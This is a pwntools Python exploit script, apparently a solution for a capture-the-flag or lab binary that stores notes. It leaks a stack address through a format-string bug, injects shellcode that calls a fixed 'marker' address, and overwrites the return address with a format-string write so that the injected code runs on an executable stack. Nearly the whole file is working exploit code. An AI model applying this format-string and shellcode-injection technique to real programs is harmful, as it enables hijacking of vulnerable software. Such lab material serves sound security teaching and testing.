#!/usr/bin/env python3
from pwn import *

if len(sys.argv) != 2:
    print("Invalid program name.")
    exit(1)
else:
    binary = sys.argv[1]

context.log_level = "error"

exe = context.binary = ELF(binary)
io = process(exe.path)

def write_note(idx, title, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", title)
    io.sendlineafter(b": ", content)

def read_note(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"Title:\n")
    title = io.recvline()
    io.recvuntil(b"Content:\n")
    content = io.recvline()
    return title, content

#Shellcode to call marker
addr_marker = 0x40157a

payload = shellcraft.mov('rax', addr_marker)
payload += "call rax\n"
bytecode = asm(payload)

#Calculating offset, injecting code and leaking stack address
offset = 34
write_note(5, b"%6$p", asm(payload))
leak_stack, content = read_note(5)

#Adress calculation
ret_addr = int(leak_stack, 16) + 0x8
shellcode_addr = ret_addr + 0x348

#Injecting string to call the injected code
write_note(1, b"a", fmtstr_payload(offset, {ret_addr : shellcode_addr}))
read_note(1)

io.wait_for_close()

exit(io.poll())

#Shellcode - executable stack